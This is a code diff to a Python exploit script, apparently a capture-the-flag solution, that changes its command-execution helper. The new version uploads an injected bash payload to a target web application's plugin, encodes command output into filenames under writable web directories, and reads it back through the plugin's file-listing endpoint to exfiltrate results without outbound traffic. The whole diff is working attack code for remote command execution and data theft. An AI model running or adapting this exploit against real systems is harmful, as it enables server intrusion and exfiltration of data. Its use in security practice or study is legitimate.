@@ -171,36 +171,37 @@ KNOWN = [
 ]
 
 
-def _write_payload(cmd, name, marker):
-    """bash that writes `marker`+`cmd` output into the extraction dir of our own
-    .p7m and every KNOWN candidate dir under the docroot."""
-    fixed = " ".join(f"'{DOCROOT}/{sub}'" if sub else f"'{DOCROOT}'"
-                     for sub, _u in KNOWN)
-    return (
-        f"P=$(find {DOCROOT} -name '*.p7m' 2>/dev/null | head -1); "
-        f"D=$(dirname \"$P\" 2>/dev/null); "
-        f"W=$(find {DOCROOT} -type d -writable 2>/dev/null); "
-        f"for d in \"$D\" {fixed} $W; do "
-        f"{{ echo {marker}; {cmd}; }} > \"$d/{name}\" 2>/dev/null; done; "
-        # also record where it actually landed, so we learn the writable subdir
-        f"for d in \"$D\" $W; do echo \"${{d#{DOCROOT}}}\" >> \"$D/{name}.map\" "
-        "2>/dev/null; done")
+def run_cmd(o, base, mid, pid, _lhost, cmd, wait=9):
+    """Exfil via the plugin's own file list. getFileList() globs *.xml* in the
+    import dir and echoes every basename in op=list's JSON — so we ENCODE the
+    command output into a filename there and read it back from that JSON. No
+    egress, no writable-then-served docroot needed.
 
-
-def run_cmd(o, base, mid, pid, _lhost, cmd, wait=7):
-    """Fire the injection to write `cmd` output web-side, then fetch it."""
-    token = "s" + os.urandom(4).hex() + "z"
-    name = token + ".txt"
-    marker = "OK" + token
-    upload(o, base, mid, pid, _write_payload(cmd, name, marker))
+    Output is filename-sanitised (A-Za-z0-9._=-), so a 32-hex flag comes back
+    verbatim; multi-line output is flattened. Returns the decoded string."""
+    marker = "SX" + os.urandom(4).hex()
+    # write the marker file into the extraction dir of our own .p7m AND every
+    # writable dir under the docroot (one of them is the dir op=list reads).
+    # base32-wrapped, so this whole script just has to be valid bash.
+    payload = "\n".join([
+        f"R={DOCROOT}",
+        f'V=$( {{ {cmd} ; }} 2>/dev/null | tr "\\n" "~" | tr -cd "A-Za-z0-9._=~-" | cut -c1-120)',
+        'P=$(find "$R" -name "*.p7m" 2>/dev/null | head -1)',
+        'D=$(dirname "$P" 2>/dev/null)',
+        'for d in "$D" $(find "$R" -type d -writable 2>/dev/null); do',
+        f'  touch "$d/{marker}${{V}}.xml" 2>/dev/null',
+        'done',
+    ])
+    upload(o, base, mid, pid, payload)
     deadline = time.time() + wait
-    urls = [base + "/" + u + name for _s, u in KNOWN]
+    list_urls = [f"{base}/actions.php?op=list&id_module={mid}&id_plugin={pid}"]
     while time.time() < deadline:
-        for u in urls:
-            body = get(o, u)
-            if marker in body:
-                return body.split(marker, 1)[1].strip()
-        time.sleep(0.4)
+        for u in list_urls:
+            body = get(o, u) or post(o, u, b"")[1]
+            m = re.findall(marker + r"([A-Za-z0-9._=~-]*)\.xml", body)
+            if m:
+                return max(m, key=len).replace("~", "\n").strip()
+        time.sleep(0.5)
     return ""
 
 
